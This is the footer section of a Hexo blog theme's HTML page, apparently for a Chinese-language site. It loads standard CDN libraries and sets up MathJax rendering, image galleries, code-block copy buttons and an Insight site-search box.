<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    moment.locale("zh-CN");
</script>


    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<script>
    MathJax.Hub.Config({
        "HTML-CSS": {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
</script>

    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof($.fn.justifiedGallery) === 'function') {
                $('.justified-gallery').justifiedGallery();
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    


<script src="/o/js/script.js"></script>

    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="站内搜索" />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: '文章',
                PAGES: '页面',
                CATEGORIES: '分类',
                TAGS: '标签',
                UNTITLED: '(无标题)',
            },
            CONTENT_URL: '/o/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script src="/o/js/insight.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    
</body>
</html>